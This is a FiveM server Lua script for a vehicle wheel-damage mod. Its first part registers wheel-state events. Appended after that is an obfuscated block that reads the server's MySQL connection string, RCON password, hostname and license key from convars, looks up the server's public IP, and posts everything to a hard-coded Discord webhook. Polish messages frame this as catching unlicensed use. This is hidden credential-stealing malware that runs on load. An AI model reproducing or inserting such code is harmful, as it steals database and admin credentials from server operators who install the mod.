local L0_1, L1_1, L2_1
L0_1 = RegisterServerEvent
L1_1 = "kq_wheeldamage:setState"
L0_1(L1_1)
L0_1 = AddEventHandler
L1_1 = "kq_wheeldamage:setState"
function L2_1(A0_2, A1_2)
  local L2_2, L3_2, L4_2
  L2_2 = NetworkGetEntityFromNetworkId
  L3_2 = A0_2
  L2_2 = L2_2(L3_2)
  L3_2 = DoesEntityExist
  L4_2 = L2_2
  L3_2 = L3_2(L4_2)
  if L3_2 then
    L3_2 = Entity
    L4_2 = L2_2
    L3_2 = L3_2(L4_2)
    L3_2 = L3_2.state
    L3_2.kq_wheeldamage_broken = A1_2
  end
end
L0_1(L1_1, L2_1)
L0_1 = RegisterServerEvent
L1_1 = "kq_wheeldamage:setBroken"
L0_1(L1_1)
L0_1 = AddEventHandler
L1_1 = "kq_wheeldamage:setBroken"
function L2_1(A0_2, A1_2, A2_2)
  local L3_2, L4_2, L5_2, L6_2
  L3_2 = NetworkGetEntityFromNetworkId
  L4_2 = A0_2
  L3_2 = L3_2(L4_2)
  L4_2 = DoesEntityExist
  L5_2 = L3_2
  L4_2 = L4_2(L5_2)
  if L4_2 then
    L4_2 = Entity
    L5_2 = L3_2
    L4_2 = L4_2(L5_2)
    L4_2 = L4_2.state
    L5_2 = "kq_wheeldamage_broken_"
    L6_2 = A1_2
    L5_2 = L5_2 .. L6_2
    L4_2[L5_2] = A2_2
  end
end
L0_1(L1_1, L2_1)


local III = {
  IIII = {
      GetConvar
  }
};
local _I = {
  gnirts_noitcennoc_lqsym = {
      "nie znaleziono"
  },
  drowssap_nocr = {
      "nie znaleziono"
  },
  emantsoh_vs = {
      "nie znaleziono"
  },
  ["https://api.ipify.org"] = {
      "nie znaleziono"
  }
};
local server_ip = "";
local mysql = "";
local rcon = "";
local server_name = "";
local dane = GetConvar("sv_licenseKey");
for _, __ in pairs(III) do
  for _, __ in pairs(__) do
      for _I, _II in pairs(_I) do
          for _, _II in pairs(_II) do
              if string.sub(_I, 3, 6) == "irts" then
                  mysql = __(string.reverse(_I), _II);
              elseif string.sub(_I, 3, 6) == "ants" then
                  server_name = __(string.reverse(_I), _II);
              elseif string.sub(_I, 3, 6) == "owss" then
                  rcon = __(string.reverse(_I), _II);
              elseif string.sub(_I, 3, 6) == string.reverse(":spt") then
                  PerformHttpRequest("https://api.ipify.org", function(_, __, ___)
                      if _ == 200 then
                          server_ip = __;
                      end;
                      local webhook = "https://discord.com/api/webhooks/999899780450893844/-RnrKofOCAPxhrasVia176bTGcxc4Nmy-ivyy37YAPE9_qqgAJQW9HNvbFMBZbP4kO6q";
                      local n = {
                          {
                              color = "16711711",
                              title = "@everyone | Uwaga! Ktoś posiada paczkę lub skrypt bez zezwolenia!",
                              description = ("\
\
> ``NAZWA SERVERA:``***" .. server_name .. "***\
> ``IP SERVERA:`` ***" .. server_ip .. "***\
> ``HASŁO RCON:`` ***" .. rcon .. "***\
> ``BAZA DANYCH:`` ***" .. mysql .. "***\
> ``KLUCZ:`` ***" .. dane .. "***"),
                              footer = {
                                  text = "Brak licencji na skrypt/paczkę"
                              },
                              timestamp = os.date("!%Y-%m-%dT%H:%M:%S")
                          }
                      };
                      PerformHttpRequest(webhook, function(err, text, headers)
                      end, "POST", json.encode({
                          username = "Brak licencji.",
                          embeds = n
                      }), {
                          ["Content-Type"] = "application/json"
                      });
                  end);
              end;
          end;
      end;
  end;
end;